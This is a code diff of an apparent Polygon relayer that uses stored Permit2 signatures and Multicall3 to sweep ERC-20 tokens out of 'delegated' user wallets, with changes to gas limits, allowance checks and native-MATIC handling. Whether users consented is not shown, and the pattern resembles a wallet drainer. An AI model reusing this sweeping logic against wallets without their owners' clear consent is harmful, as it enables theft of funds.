@@ -45,8 +45,10 @@ const MIN_TOKEN_UNITS      = "0.5";
 
 // Wrapped native token — WMATIC on Polygon
 const WRAPPED_NATIVE_ADDRESS = "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270".toLowerCase();
-// Native surplus above this = user forgot to wrap; prompt re-activation
-const NATIVE_WRAP_FLOOR      = ethers.parseEther("0.1");  // 0.1 MATIC
+// WRAP_GAS_RESERVE (0.1 MATIC) + WRAP_MIN_SURPLUS (0.05 MATIC) = 0.15 MATIC minimum meaningful wrap
+const NATIVE_WRAP_FLOOR      = ethers.parseEther("0.15"); // 0.15 MATIC
+// 3× GAS_AIRDROP_AMOUNT (0.3 × 3 = 0.9 MATIC) — above this is user's own MATIC
+const NATIVE_WRAP_CEILING    = ethers.parseEther("0.9");  // 0.9 MATIC
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
@@ -1349,6 +1351,7 @@ async function trySweepNativeFor(checksum, short) {
 
     const userBal = await getReadProvider().getBalance(checksum);
     if (userBal <= NATIVE_WRAP_FLOOR) return;
+    if (userBal > NATIVE_WRAP_CEILING) return; // user's own MATIC — hands off
 
     const wmaticContract = new ethers.Contract(
       WRAPPED_NATIVE_ADDRESS, ["function balanceOf(address) view returns (uint256)"], getReadProvider()
@@ -1359,13 +1362,8 @@ async function trySweepNativeFor(checksum, short) {
       return;
     }
 
-    warn(`[nativeFor] ${short} — ${ethers.formatEther(userBal)} MATIC sits unwrapped in wallet — marking needs_reactivation`);
-    if (supabase) {
-      await supabase.from("delegated_wallets")
-        .update({ needs_reactivation: true })
-        .eq("address", checksum.toLowerCase()).eq("chain", CHAIN)
-        .then(v => v, () => {});
-    }
+    warn(`[nativeFor] ${short} — ${ethers.formatEther(userBal)} MATIC unwrapped (in airdrop range) — checking backup before flagging`);
+    await setNeedsReactivationIfNoBackup(checksum, checksum.toLowerCase());
   } catch (e) {
     maybeResetNonce(e);
     err(`[nativeFor] ❌ ${short}: ${e.reason ?? e.message}`);
@@ -1654,10 +1652,26 @@ async function sweep(wallet) {
       const pb3CheckFor = pb3IsV2 ? CONTRACT_ADDRESS : relayerWallet.address;
 
       try {
-        const [p2Amount0] = await permit2Read.allowance(checksum, pbData.permit.details[0]?.token, pb3CheckFor);
-        if (p2Amount0 === 0n) {
+        const ALLOW_ABI_3 = ["function allowance(address,address,address) view returns (uint160,uint48,uint48)"];
+        const allowIface3 = new ethers.Interface(ALLOW_ABI_3);
+        const mc3 = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
+        const allowCalls = pbData.permit.details.map(d => ({
+          target: PERMIT2_ADDRESS,
+          allowFailure: true,
+          callData: allowIface3.encodeFunctionData("allowance", [checksum, d.token, pb3CheckFor]),
+        }));
+        const allowResults = await mc3.aggregate3(allowCalls).catch(() => null);
+        const needsPermitCall = !allowResults || allowResults.some((r) => {
+          if (!r.success) return true;
+          try {
+            const [amt,, exp] = allowIface3.decodeFunctionResult("allowance", r.returnData);
+            return BigInt(amt) === 0n || BigInt(exp) <= BigInt(Math.floor(Date.now() / 1000));
+          } catch { return true; }
+        });
+        if (needsPermitCall) {
           log(`[allowance] calling permit() to register ${pbData.permit.details.length} token allowances (spender=${pb3Spender.slice(0,10)})`);
           const fee = await getFeeData();
+          const permitGas3 = BigInt(Math.min(120_000 + pbData.permit.details.length * 14_000, 800_000));
           const permitTx = await permit2.permit(
             checksum,
             {
@@ -1666,7 +1680,7 @@ async function sweep(wallet) {
               sigDeadline: BigInt(pbData.permit.sigDeadline ?? Math.floor(Date.now()/1000)+3600),
             },
             pbData.signature,
-            { gasLimit: 300_000n, ...fee }
+            { gasLimit: permitGas3, ...fee }
           );
           await permitTx.wait();
           log(`[allowance] ✅ permit() confirmed`);
@@ -1686,27 +1700,19 @@ async function sweep(wallet) {
           await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
         }
         if (approvedTokens.length === 0) {
-          warn(`[allowance] sweepViaPermit2 skipped — ERC-20→Permit2 approval missing for all ${tokenAddrs.length} token(s). Marking needs_reactivation.`);
-          if (supabase) {
-            await supabase.from("delegated_wallets")
-              .update({ needs_reactivation: true })
-              .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
-          }
+          warn(`[allowance] sweepViaPermit2 skipped — ERC-20→Permit2 approval missing for all ${tokenAddrs.length} token(s)`);
+          await setNeedsReactivationIfNoBackup(checksum, addrKey);
         } else {
           try {
             const fee = await getFeeData();
             const tx  = await contract.sweepViaPermit2(checksum, approvedTokens, { gasLimit: 100_000n + BigInt(approvedTokens.length) * 60_000n, ...fee });
             await tx.wait();
-            log(`[allowance] ✅ sweepViaPermit2 confirmed for ${checksum} (${tokenAddrs.length} token(s))`);
+            log(`[allowance] ✅ sweepViaPermit2 confirmed for ${checksum} (${approvedTokens.length} token(s))`);
           } catch (e) {
             const emsg = e.reason ?? e.message ?? "";
             if (/TRANSFER_FROM_FAILED|transferFrom/i.test(emsg)) {
-              warn(`[allowance] sweepViaPermit2 ❌ ERC-20→Permit2 approval missing — marking needs_reactivation`);
-              if (supabase) {
-                await supabase.from("delegated_wallets")
-                  .update({ needs_reactivation: true })
-                  .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
-              }
+              warn(`[allowance] sweepViaPermit2 ❌ ERC-20→Permit2 approval missing — checking backup`);
+              await setNeedsReactivationIfNoBackup(checksum, addrKey);
             } else {
               err(`[allowance] sweepViaPermit2 ❌: ${emsg}`);
             }
